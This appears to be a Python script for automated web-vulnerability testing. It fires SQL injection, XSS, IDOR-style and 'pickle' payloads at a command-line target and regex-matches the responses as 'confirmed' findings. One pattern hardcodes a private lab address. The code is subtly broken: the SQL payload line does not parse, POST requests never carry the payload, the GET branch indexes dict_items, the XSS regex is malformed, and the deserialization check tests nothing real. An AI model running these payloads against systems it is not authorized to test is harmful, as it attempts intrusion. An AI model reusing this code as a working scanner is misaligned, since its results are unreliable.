import json
import re
import requests

def inject_payload(target_url, endpoint, method, headers, body):
    # Define potential payloads for different scenarios
    payloads = {
        "SQL Injection": "\'" OR \'1\'=\'1",
        "XSS": "<script>alert('XSS')</script>",
        "IDOR": "?id=1' AND '1'='1",
        "Insecure Deserialization (pickle)": "'import pickle; pickle.dumps({'value': 1})'"
    }

    # Define regex patterns to match successful payloads
    regex_patterns = {
        "SQL Injection": re.compile(r"(\d+): (Query .* failed)"),
        "XSS": re.compile(r"<script>alert\(\'XSS\'\<\/script>"),
        "IDOR": re.compile(r"http://192\.168\.2\.69:3000/rest/user/\d+/profile"),
        "Insecure Deserialization (pickle)": re.compile(r"pickle.dumps.*")
    }

    confirmed_vulnerabilities = {}
    for vulnerability, payload in payloads.items():
        try:
            if method == "POST":
                response = requests.post(target_url + endpoint, headers=headers, json=json.loads(body))
            elif method == "GET":
                response = requests.get(target_url + endpoint + f"&{json.loads(body).items()[0][0]}={payload}")
            
            # Check for confirmed vulnerability
            if re.search(regex_patterns[vulnerability], str(response.content)):
                confirmed_vulnerabilities[vulnerability] = payload, response.text

        except Exception as e:
            print(f"Error testing {vulnerability}: {e}")

    return confirmed_vulnerabilities

def main(input_data):
    try:
        data = json.loads(input_data)
        target_url = data.get("target_url")
        endpoint = data.get("endpoint", "")
        method = data.get("method", "POST")
        headers = data.get("headers") or {}
        body = data.get("body") or {}

        if not all([target_url, method]):
            return {"error": "Missing required fields"}

        confirmed_vulnerabilities = inject_payload(target_url, endpoint, method, headers, json.dumps(body))

        if confirmed_vulnerabilities:
            return {
                "confirmed": True,
                "successful_payloads": [payload for payload in confirmed_vulnerabilities.values()],
                "evidence": list(confirmed_vulnerabilities.items())
            }
        else:
            return {"confirmed": False}

    except Exception as e:
        return {"error": str(e)}

if __name__ == '__main__':
    import sys
    print(json.dumps(main(sys.argv[1])))